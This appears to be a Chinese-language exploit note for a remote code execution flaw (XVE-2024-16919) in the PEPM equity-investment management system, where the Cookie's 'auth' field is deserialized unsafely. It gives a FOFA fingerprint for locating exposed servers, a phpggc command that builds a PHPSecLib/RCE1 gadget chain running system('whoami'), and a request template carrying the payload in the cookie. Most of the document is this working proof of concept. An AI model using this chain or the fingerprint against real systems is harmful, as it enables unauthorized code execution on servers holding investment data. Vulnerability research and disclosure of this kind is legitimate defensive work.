# PEPM系统Cookie存在远程代码执行漏洞(XVE-2024-16919)

PEPM是由苏州梓川信息科技有限公司开发的中国领先股权投资管理软件。PEPM致力于将成熟互联网技术与企业业务应用结合，为用户提供专业、易用且低成本的软件服务。 PEPM系统存在远程代码执行漏洞，Cookie的auth字段存在反序列化漏洞，攻击者可构造反序列化链生成恶意数据，执行任意PHP代码。

## fofa

```yaml
"PEPM 中国领先的股权投资管理软件"
```

## poc

使用 phpggc 生成恶意序列化数据 ，工具地址 ：https://github.com/ambionics/phpggc

```bash
./phpggc -u PHPSecLib/RCE1 "system('whoami');"
```

```java
POST / HTTP/1.1
Host:
Cookie: auth=序列化数据
```

![image-20240803122910588](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408031229659.png)